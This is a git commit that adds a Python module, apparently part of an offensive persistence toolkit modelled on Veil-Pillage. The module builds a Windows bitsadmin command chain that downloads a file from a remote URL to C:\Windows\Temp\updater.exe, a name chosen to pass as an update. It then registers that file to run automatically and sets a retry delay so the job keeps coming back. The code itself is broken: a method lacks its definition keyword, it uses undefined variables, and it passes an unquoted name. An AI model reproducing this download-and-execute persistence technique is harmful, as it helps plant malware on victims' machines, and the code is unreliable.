d3c8e8be9bd9f3d2a603a7c0e7451dbb05c0c9d6
Jastra <jaredestroud@gmail.com>
2015-11-02 11:39:58 -0500

    Creating Windows bitsadmin Python background job to download files. Had issues with Visual Studio trying to run this file (I think it's because I was using Visual Studio).

---
+++ persistence/windows/bitsadmin.py
@@ -0,0 +1,16 @@
+﻿#!/usr/bin/env python
+'''
+	Inspired by  Veil Pillage
+		https://github.com/Veil-Framework/Veil-Pillage/blob/master/modules/persistence/bitsadmin.py
+	
+	'''
+
+class bitsAdmin:
+    
+	bitskdrop(self, url, job_name):
+        cmd = "bitsadmin /create "+job_name+" & bitsadmin /addfile "+job_name+" "+exe_url+" C:\Windows\Temp\updater.exe & bitsadmin /SETNOTIFYCMDLINE "+job_name+" C:\Windows\Temp\updater.exe NULL & bitsadmin /SETMINRETRYDELAY "+job_name+" "+str(int(interval)*60) + " & bitsadmin /resume "+job_name
+
+
+if __name__ == "__main__":
+    dirtyBit = bitsAdmin()
+    dirtyBit.bitskdrop("http://www.google.com", JavaOfficeUpdater)
